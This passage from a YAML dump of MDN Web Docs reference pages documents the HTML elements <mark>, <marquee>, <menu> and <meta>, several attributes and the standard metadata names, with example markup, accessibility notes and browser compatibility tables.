\n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/map](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/map)"
- name: mark
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<mark\\>: The Mark Text element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fmark&level=high)\n\nThe `<mark>` [HTML](../index) element represents text which is **marked** or **highlighted** for reference or notation purposes due to the marked passage's relevance in the enclosing context.\n\n## Try it\n\n#### HTML Demo: \\<mark\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Search results for \"salamander\":</p>\n\n    <hr />\n\n    <p>Several species of <mark>salamander</mark> inhabit the temperate rainforest of the Pacific Northwest.</p>\n\n    <p>Most <mark>salamander</mark>s are nocturnal, and hunt for insects, worms, and other small creatures.</p>\n\n    /* stylelint-disable-next-line block-no-empty */\n    mark {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nTypical use cases for `<mark>` include:\n\n- When used in a quotation ([`<q>`](q)) or block quote ([`<blockquote>`](blockquote)), it generally indicates text which is of special interest but is not marked in the original source material, or material which needs special scrutiny even though the original author didn't think it was of particular importance. Think of this like using a highlighter pen in a book to mark passages that you find of interest.\n- Otherwise, `<mark>` indicates a portion of the document's content which is likely to be relevant to the user's current activity. This might be used, for example, to indicate the words that matched a search operation.\n- Don't use `<mark>` for syntax highlighting purposes; instead, use the [`<span>`](span) element with appropriate CSS applied to it.\n\n**Note:** Don't confuse `<mark>` with the [`<strong>`](strong) element; `<mark>` is used to denote content which has a degree of *relevance*, while `<strong>` indicates spans of text of *importance*.\n\n## Accessibility\n\nThe presence of the `mark` element is not announced by most screen reading technology in its default configuration. It can be made to be announced by using the CSS [`content`](https://developer.mozilla.org/en-US/docs/Web/CSS/content) property, along with the [`::before`](https://developer.mozilla.org/en-US/docs/Web/CSS/::before) and [`::after`](https://developer.mozilla.org/en-US/docs/Web/CSS/::after) pseudo-elements.\n\ncss\n\n```\nmark::before,\nmark::after {\n  clip-path: inset(100%);\n  clip: rect(1px, 1px, 1px, 1px);\n  height: 1px;\n  overflow: hidden;\n  position: absolute;\n  white-space: nowrap;\n  width: 1px;\n}\n\nmark::before {\n  content: \" [highlight start] \";\n}\n\nmark::after {\n  content: \" [highlight end] \";\n}\n```\n\nSome people who use screen readers deliberately disable announcing content that creates extra verbosity. Because of this, it is important to not abuse this technique and only apply it in situations where not knowing content has been highlighted would adversely affect understanding.\n\n- [Short note on making your mark (more accessible) \\| The Paciello Group](https://www.tpgi.com/short-note-on-making-your-mark-more-accessible/)\n- [Tweaking Text Level Styles \\| Adrian Roselli](https://adrianroselli.com/2017/12/tweaking-text-level-styles.html)\n\n## Examples\n\n### Marking text of interest\n\nIn this first example, a `<mark>` element is used to mark some text within a quote which is of particular interest to the user.\n\nhtml\n\n```\n<blockquote>\n  It is a period of civil war. Rebel spaceships, striking from a hidden base,\n  have won their first victory against the evil Galactic Empire. During the\n  battle, <mark>Rebel spies managed to steal secret plans</mark> to the Empire's\n  ultimate weapon, the DEATH STAR, an armored space station with enough power to\n  destroy an entire planet.\n</blockquote>\n```\n\n#### Result\n\n### Identifying context-sensitive passages\n\nThis example demonstrates using `<mark>` to mark search results within a passage.\n\nhtml\n\n```\n<p>\n  It is a dark time for the Rebellion. Although the Death Star has been\n  destroyed, <mark class=\"match\">Imperial</mark> troops have driven the Rebel\n  forces from their hidden base and pursued them across the galaxy.\n</p>\n\n<p>\n  Evading the dreaded <mark class=\"match\">Imperial</mark> Starfleet, a group of\n  freedom fighters led by Luke Skywalker has established a new secret base on\n  the remote ice world of Hoth.\n</p>\n```\n\nTo help distinguish the use of `<mark>` for search results from other potential usage, this example applies the custom class `\"match\"` to each match.\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                               |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `mark` | 7       | 12   | 4       | 11    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/mark](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/mark)"
- name: marquee
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<marquee\\>: The Marquee element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<marquee>` [HTML](../index) element is used to insert a scrolling area of text. You can control what happens when the text reaches the edges of its content area using its attributes.\n\n## Attributes\n\n[`behavior`](#behavior) Deprecated  \nSets how the text is scrolled within the marquee. Possible values are `scroll`, `slide` and `alternate`. If no value is specified, the default value is `scroll`.\n\n[`bgcolor`](#bgcolor) Deprecated  \nSets the background color through color name or hexadecimal value.\n\n[`direction`](#direction) Deprecated  \nSets the direction of the scrolling within the marquee. Possible values are `left`, `right`, `up` and `down`. If no value is specified, the default value is `left`.\n\n[`height`](#height) Deprecated  \nSets the height in pixels or percentage value.\n\n[`hspace`](#hspace) Deprecated  \nSets the horizontal margin\n\n[`loop`](#loop) Deprecated  \nSets the number of times the marquee will scroll. If no value is specified, the default value is −1, which means the marquee will scroll continuously.\n\n[`scrollamount`](#scrollamount) Deprecated  \nSets the amount of scrolling at each interval in pixels. The default value is 6.\n\n[`scrolldelay`](#scrolldelay) Deprecated  \nSets the interval between each scroll movement in milliseconds. The default value is 85. Note that any value smaller than 60 is ignored and the value 60 is used instead unless `truespeed` is specified.\n\n[`truespeed`](#truespeed) Deprecated  \nBy default, `scrolldelay` values lower than 60 are ignored. If `truespeed` is present, those values are not ignored.\n\n[`vspace`](#vspace) Deprecated  \nSets the vertical margin in pixels or percentage value.\n\n[`width`](#width) Deprecated  \nSets the width in pixels or percentage value.\n\n## Event handlers\n\n[`onbounce`](#onbounce) Deprecated  \nFires when the marquee has reached the end of its scroll position. It can only fire when the behavior attribute is set to `alternate`.\n\n[`onfinish`](#onfinish) Deprecated  \nFires when the marquee has finished the amount of scrolling that is set by the loop attribute. It can only fire when the loop attribute is set to some number that is greater than 0.\n\n[`onstart`](#onstart) Deprecated  \nFires when the marquee starts scrolling.\n\n## Methods\n\n[`start()`](#start) Deprecated  \nStarts scrolling of the marquee.\n\n[`stop()`](#stop) Deprecated  \nStops scrolling of the marquee.\n\n## Examples\n\nhtml\n\n```\n<marquee>This text will scroll from right to left</marquee>\n\n<marquee direction=\"up\">This text will scroll from bottom to top</marquee>\n\n<marquee\n  direction=\"down\"\n  width=\"250\"\n  height=\"200\"\n  behavior=\"alternate\"\n  style=\"border:solid\">\n  <marquee behavior=\"alternate\">This text will bounce</marquee>\n</marquee>\n```\n\n### Result\n\n## Technical summary\n\n|               |                                                                                             |\n|---------------|---------------------------------------------------------------------------------------------|\n| DOM interface | [`HTMLMarqueeElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMarqueeElement) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`HTMLMarqueeElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMarqueeElement)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/marquee](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/marquee)"
- name: max (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`max`](attributes/max)

    [`<input>`](element/input), [`<meter>`](element/meter), [`<progress>`](element/progress)

    Indicates the maximum value allowed.
- name: maxlength (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`maxlength`](attributes/maxlength)

    [`<input>`](element/input), [`<textarea>`](element/textarea)

    Defines the maximum number of characters allowed in the element.
- name: media (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`media`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/media)

    [`<a>`](element/a), [`<area>`](element/area), [`<link>`](element/link), [`<source>`](element/source), [`<style>`](element/style)

    Specifies a hint of the media for which the linked resource was designed.
- name: menu
  summary: The <menu> HTML element is described in the HTML specification as a semantic alternative to <ul>, but treated by browsers (and exposed through the accessibility tree) as no different than <ul>
  description: "# \\<menu\\>: The Menu element\n\nThe `<menu>` [HTML](../index) element is described in the HTML specification as a semantic alternative to [`<ul>`](ul), but treated by browsers (and exposed through the accessibility tree) as no different than [`<ul>`](ul). It represents an unordered list of items (which are represented by [`<li>`](li) elements).\n\n## Try it\n\n#### HTML Demo: \\<menu\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div class=\"news\">\n      <a href=\"#\">NASA’s Webb Delivers Deepest Infrared Image of Universe Yet</a>\n      <menu>\n        <li><button id=\"save\">Save for later</button></li>\n        <li><button id=\"share\">Share this news</button></li>\n      </menu>\n    </div>\n\n    .news {\n      background-color: bisque;\n      padding: 1em;\n      border: solid thin black;\n    }\n\n    menu {\n      list-style-type: none;\n      display: flex;\n      padding: 0;\n      margin-bottom: 0;\n      gap: 1em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<menu>` and [`<ul>`](ul) elements both represent an unordered list of items. The key difference is that [`<ul>`](ul) primarily contains items for display, while `<menu>` was intended for interactive items.\n\n**Note:** In early versions of the HTML specification, the `<menu>` element had an additional use case as a context menu. This functionality is considered obsolete and is not in the specification.\n\n## Examples\n\n### Toolbar\n\nIn this example, a `<menu>` is used to create a toolbar for an editing application.\n\n#### HTML\n\nhtml\n\n```\n<menu>\n  <li><button onclick=\"copy()\">Copy</button></li>\n  <li><button onclick=\"cut()\">Cut</button></li>\n  <li><button onclick=\"paste()\">Paste</button></li>\n</menu>\n```\n\nNote that this is functionally no different from:\n\nhtml\n\n```\n<ul>\n  <li><button onclick=\"copy()\">Copy</button></li>\n  <li><button onclick=\"cut()\">Cut</button></li>\n  <li><button onclick=\"paste()\">Paste</button></li>\n</ul>\n```\n\n#### CSS\n\ncss\n\n```\nmenu,\nul {\n  display: flex;\n  list-style: none;\n  padding: 0;\n  width: 400px;\n}\n\nli {\n  flex-grow: 1;\n}\n\nbutton {\n  width: 100%;\n}\n```\n\n#### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content). If the element's children include at least one [`<li>`](li) element: [Palpable content](../content_categories#palpable_content|\n| Permitted content                           | Zero or more occurrences of [`<li>`](li), [`<script>`](script), and [`<template>`](template|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content|\n| Implicit ARIA role                          | [`list`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/list_role)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |\n| Permitted ARIA roles                        | [`directory`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/directory_role), [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`listbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/listbox_role), [`menu`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menu_role), [`menubar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menubar_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`radiogroup`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radiogroup_role), [`tablist`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tablist_role), [`toolbar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/toolbar_role) or [`tree`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tree_role) |\n| DOM interface                               | [`HTMLMenuElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMenuElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `menu` | 1       | 12   | 1       | ≤12.1 | 3      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- Other list-related HTML Elements: [`<ol>`](ol), [`<ul>`](ul), and [`<li>`](li).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/menu](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/menu)"
- name: meta
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<meta\\>: The metadata element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fmeta&level=high)\n\nThe `<meta>` [HTML](../index) element represents [metadata](https://developer.mozilla.org/en-US/docs/Glossary/Metadata) that cannot be represented by other HTML meta-related elements, like [`<base>`](base), [`<link>`](link), [`<script>`](script), [`<style>`](style) or [`<title>`](title).\n\nThe type of metadata provided by the `<meta>` element can be one of the following:\n\n- If the [`name`](#name) attribute is set, the `<meta>` element provides *document-level metadata*, applying to the whole page.\n- If the [`http-equiv`](#http-equiv) attribute is set, the `<meta>` element is a *pragma directive*, providing information equivalent to what can be given by a similarly-named HTTP header.\n- If the [`charset`](#charset) attribute is set, the `<meta>` element is a *charset declaration*, giving the character encoding in which the document is encoded.\n- If the [`itemprop`](../global_attributes/itemprop) attribute is set, the `<meta>` element provides *user-defined metadata*.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n**Note:** The attribute [`name`](#name) has a specific meaning for the `<meta>` element, and the [`itemprop`](../global_attributes/itemprop) attribute must not be set on the same `<meta>` element that has any existing [`name`](#name), [`http-equiv`](#http-equiv) or [`charset`](#charset) attributes.\n\n[`charset`](#charset)  \nThis attribute declares the document's character encoding. If the attribute is present, its value must be an ASCII case-insensitive match for the string `\"utf-8\"`, because UTF-8 is the only valid encoding for HTML5 documents. `<meta>` elements which declare a character encoding must be located entirely within the first 1024 bytes of the document.\n\n[`content`](#content)  \nThis attribute contains the value for the [`http-equiv`](#http-equiv) or [`name`](#name) attribute, depending on which is used.\n\n[`http-equiv`](#http-equiv)  \nDefines a pragma directive. The attribute is named `http-equiv(alent)` because all the allowed values are names of particular HTTP headers:\n\n- `content-security-policy` Allows page authors to define a [content policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) for the current page. Content policies mostly specify allowed server origins and script endpoints which help guard against cross-site scripting attacks.\n- `content-type` Declares the [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) and the document's character encoding. The `content` attribute must have the value `\"text/html; charset=utf-8\"` if specified. This is equivalent to a `<meta>` element with the [`charset`](#charset) attribute specified and carries the same restriction on placement within the document. **Note:** Can only be used in documents served with a `text/html` — not in documents served with an XML MIME type.\n- `default-style` Sets the name of the default [CSS style sheet](https://developer.mozilla.org/en-US/docs/Web/CSS) set.\n- `x-ua-compatible` If specified, the `content` attribute must have the value `\"IE=edge\"`. User agents are required to ignore this pragma.\n- `refresh` This instruction specifies:\n  - The number of seconds until the page should be reloaded - only if the [`content`](#content) attribute contains a non-negative integer.\n  - The number of seconds until the page should redirect to another - only if the [`content`](#content) attribute contains a non-negative integer followed by the string '`;url=`', and a valid URL.\n\n  The timer starts when the page is *completely loaded*, which is after the [`load`](https://developer.mozilla.org/en-US/docs/Web/API/Window/load_event) and [`pageshow`](https://developer.mozilla.org/en-US/docs/Web/API/Window/pageshow_event) events have both fired.\n  **Warning:**\n\n  Pages set with a `refresh` value run the risk of having the time interval being too short. People navigating with the aid of assistive technology such as a screen reader may be unable to read through and understand the page's content before being automatically redirected. The abrupt, unannounced updating of the page content may also be disorienting for people experiencing low vision conditions.\n\n  - [MDN Understanding WCAG, Guideline 2.2 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.2_%E2%80%94_enough_time_provide_users_enough_time_to_read_and_use_content)\n  - [MDN Understanding WCAG, Guideline 3.2 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Understandable#guideline_3.2_%E2%80%94_predictable_make_web_pages_appear_and_operate_in_predictable_ways)\n  - [Understanding Success Criterion 2.2.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/time-limits-required-behaviors.html)\n  - [Understanding Success Criterion 2.2.4 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/time-limits-postponed.html)\n  - [Understanding Success Criterion 3.2.5 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/consistent-behavior-no-extreme-changes-context.html)\n\n[`name`](#name)  \nThe `name` and `content` attributes can be used together to provide document metadata in terms of name-value pairs, with the `name` attribute giving the metadata name, and the `content` attribute giving the value.\n\nSee [standard metadata names](meta/name) for details about the set of standard metadata names defined in the HTML specification.\n\n## Examples\n\nhtml\n\n```\n<meta charset=\"utf-8\" />\n\n<!-- Redirect page after 3 seconds -->\n<meta http-equiv=\"refresh\" content=\"3;url=https://www.mozilla.org\" />\n```\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|              | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|              | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `meta`       | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `charset`    | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `content`    | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `http-equiv` | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `name`       | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `scheme`     | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [Standard metadata names](meta/name)\n- [Learn: `<meta>`](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/The_head_metadata_in_HTML#metadata_the_meta_element)\n- [The viewport meta tag](../viewport_meta_tag)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta)"
- name: meta.name
  summary: This feature is well established and works across many devices and browser versions
  description: "# Standard metadata names\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fmeta%2Fname&level=high)\n\nThe [`<meta>`](../meta) element can be used to provide document metadata in terms of name-value pairs, with the [`name`](../meta#name) attribute giving the metadata name, and the [`content`](../meta#content) attribute giving the value.\n\n### Standard metadata names defined in the HTML specification\n\nThe HTML specification defines the following set of standard metadata names:\n\n- `application-name`: the name of the application running in the web page.\n  **Note:**\n\n  - Browsers may use this to identify the application. It is different from the [`<title>`](../title) element, which usually contain the application name, but may also contain information like the document name or a status.\n  - Simple web pages shouldn't define an application-name.\n- `author`: the name of the document's author.\n- `description`: a short and accurate summary of the content of the page. Search engines like [Google](https://developers.google.com/search/docs/appearance/snippet#meta-descriptions) may use this field to control the appearance of the webpage in the search result.\n- `generator`: the identifier of the software that generated the page.\n- `keywords`: words relevant to the page's content separated by commas.\n- `referrer`: controls the HTTP [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header of requests sent from the document:\n  |                                   |                                                                                                                                                                                                   |\n  |-----------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n  | `no-referrer`                     | Do not send a HTTP [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header.                                                                                         |\n  | `origin`                          | Send the [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin) of the document.                                                                                                      |\n  | `no-referrer-when-downgrade`      | Send the full URL when the destination is at least as secure as the current page (HTTP(S)→HTTPS), but send no referrer when it's less secure (HTTPS→HTTP). This is the default behavior.          |\n  | `origin-when-cross-origin`        | Send the full URL (stripped of parameters) for same-origin requests, but only send the origin for other cases.                                                                                    |\n  | `same-origin`                     | Send the full URL (stripped of parameters) for same-origin requests. Cross-origin requests will contain no referrer header.                                                                       |\n  | `strict-origin`                   | Send the origin when the destination is at least as secure as the current page (HTTP(S)→HTTPS), but send no referrer when it's less secure (HTTPS→HTTP).                                          |\n  | `strict-origin-when-cross-origin` | Send the full URL (stripped of parameters) for same-origin requests. Send the origin when the destination is at least as secure as the current page (HTTP(S)→HTTPS). Otherwise, send no referrer. |\n  | `unsafe-URL`                      | Send the full URL (stripped of parameters) for same-origin or cross-origin requests.                                                                                                              |\n\n  Values for the `content` attribute of `<meta name=\"referrer\">`\n\n  **Note:**\n\n  - Dynamically inserting `<meta name=\"referrer\">` (with [`document.write()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/write) or [`appendChild()`](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild)) makes the referrer behavior unpredictable.\n  - When several conflicting policies are defined, the `no-referrer` policy is applied.\n- [`theme-color`](name/theme-color): indicates a suggested color that user agents should use to customize the display of the page or of the surrounding user interface. The `content` attribute contains a valid CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value). The `media` attribute with a valid media query list can be included to set the media the theme color metadata applies to.\n- `color-scheme`: specifies one or more color schemes with which the document is compatible. The browser will use this information in tandem with the user's browser or device settings to determine what colors to use for everything from background and foregrounds to form controls and scrollbars. The primary use for `<meta name=\"color-scheme\">` is to indicate compatibility with—and order of preference for—light and dark color modes. The value of the [`content`](../meta#content) property for `color-scheme` may be one of the following:\n  [`normal`](#normal)  \n  The document is unaware of color schemes and should be rendered using the default color palette.\n\n  [`light`](#light), `dark`, `light dark`, `dark light`  \n  One or more color schemes supported by the document. Specifying the same color scheme more than once has the same effect as specifying it only once. Indicating multiple color schemes indicates that the first scheme is preferred by the document, but that the second specified scheme is acceptable if the user prefers it.\n\n  [`only light`](#only_light)  \n  Indicates that the document *only* supports light mode, with a light background and dark foreground colors. By specification, `only dark` *is not valid*, because forcing a document to render in dark mode when it isn't truly compatible with it can result in unreadable content; all major browsers default to light mode if not otherwise configured.\n\n  For example, to indicate that a document prefers dark mode but does render functionally in light mode as well:\n  html\n\n  ```\n  <meta name=\"color-scheme\" content=\"dark light\" />\n  ```\n\n  This works at the document level in the same way that the CSS [`color-scheme`](https://developer.mozilla.org/en-US/docs/Web/CSS/color-scheme) property lets individual elements specify their preferred and accepted color schemes. Your styles can adapt to the current color scheme using the [`prefers-color-scheme`](https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-color-scheme) CSS media feature.\n\n### Standard metadata names defined in other specifications\n\nThe CSS Device Adaptation specification defines the following metadata name:\n\n- `viewport`: gives hints about the size of the initial size of the [viewport](https://developer.mozilla.org/en-US/docs/Glossary/Viewport).\n  [TABLE]\n\n  Values for the content of `<meta name=\"viewport\">`\n\n  **Warning:**\n\n  Disabling zooming capabilities by setting `user-scalable` to a value of `no` prevents people experiencing low vision conditions from being able to read and understand page content.\n\n  - [MDN Understanding WCAG, Guideline 1.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.4_make_it_easier_for_users_to_see_and_hear_content_including_separating_foreground_from_background)\n  - [Understanding Success Criterion 1.4.4 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/visual-audio-contrast-scale.html)\n\n### Other metadata names\n\nThe [WHATWG Wiki MetaExtensions page](https://wiki.whatwg.org/wiki/MetaExtensions) contains a large set of non-standard metadata names that have not been formally accepted yet; however, some of the names included there are already used quite commonly in practice — including the following:\n\n- `creator`: the name of the creator of the document, such as an organization or institution. If there are more than one, several [`<meta>`](../meta) elements should be used.\n- `googlebot`, a synonym of `robots`, is only followed by Googlebot (the indexing crawler for Google).\n- `publisher`: the name of the document's publisher.\n- `robots`: the behavior that cooperative crawlers, or \"robots\", should use with the page. It is a comma-separated list of the values below:\n  | Value          | Description                                                                 | Used by                                                                                                                                                                                                                                                  |\n  |----------------|-----------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n  | `index`        | Allows the robot to index the page (default).                               | All                                                                                                                                                                                                                                                      |\n  | `noindex`      | Requests the robot to not index the page.                                   | All                                                                                                                                                                                                                                                      |\n  | `follow`       | Allows the robot to follow the links on the page (default).                 | All                                                                                                                                                                                                                                                      |\n  | `nofollow`     | Requests the robot to not follow the links on the page.                     | All                                                                                                                                                                                                                                                      |\n  | `all`          | Equivalent to `index, follow`                                               | [Google](https://developers.google.com/search/docs/crawling-indexing/special-tags?visit_id=637855965067987211-415685194&rd=1)                                                                                                                            |\n  | `none`         | Equivalent to `noindex, nofollow`                                           | [Google](https://developers.google.com/search/docs/crawling-indexing/special-tags?visit_id=637855965074074862-574753619&rd=1)                                                                                                                            |\n  | `noarchive`    | Requests the search engine not to cache the page content.                   | [Google](https://developers.google.com/search/docs/crawling-indexing/robots-meta-tag), [Yahoo](https://help.yahoo.com/kb/search-for-desktop/SLN2213.html), [Bing](https://www.bing.com/webmasters/help/which-robots-metatags-does-bing-support-5198d240) |\n  | `nosnippet`    | Prevents displaying any description of the page in search engine results.   | [Google](https://developers.google.com/search/docs/crawling-indexing/robots-meta-tag), [Bing](https://www.bing.com/webmasters/help/which-robots-metatags-does-bing-support-5198d240)                                                                     |\n  | `noimageindex` | Requests this page not to appear as the referring page of an indexed image. | [Google](https://developers.google.com/search/docs/crawling-indexing/robots-meta-tag)                                                                                                                                                                    |\n  | `nocache`      | Synonym of `noarchive`.                                                     | 